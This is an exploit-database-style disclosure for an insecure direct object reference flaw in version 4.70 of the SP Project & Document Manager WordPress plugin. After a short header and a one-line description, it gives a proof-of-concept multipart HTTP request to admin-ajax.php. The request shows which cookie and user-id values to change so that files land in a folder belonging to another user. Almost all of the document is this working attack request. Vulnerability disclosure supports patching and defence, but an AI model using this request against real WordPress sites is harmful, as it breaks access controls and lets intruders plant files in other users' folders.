# Exploit Title: SP Project & Document Manager v4.70 - Insecure Direct Object Reference(IDOR)
## Date: 2/20/2024
## Vendor Homepage: https://cn.wordpress.org/plugins/sp-client-document-manager/
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SP Project & Document Manager
## Version: v4.70
## Exploit Description:
## SP Project & Document Manager v4.70 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to upload files in folder that is assigned to other user(horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
POST /wp-admin/admin-ajax.php HTTP/1.1
...

Cookie: ...; pid=1(CHANGE HERE)
Connection: close

------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="file[]"; filename="IMG_0628.PNG"
Content-Type: image/png

...

------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="action"

sp_file_upload_callback
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="uid"

2
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="cdm_upload_file_field"

f52aada0f5
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="_wp_http_referer"

/sppage
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="dlg-upload-name"

img
------WebKitFormBoundaryX4YnPgSA4oPHlNjv
Content-Disposition: form-data; name="dlg-upload-notes"

hello
------WebKitFormBoundaryX4YnPgSA4oPHlNjv--

```
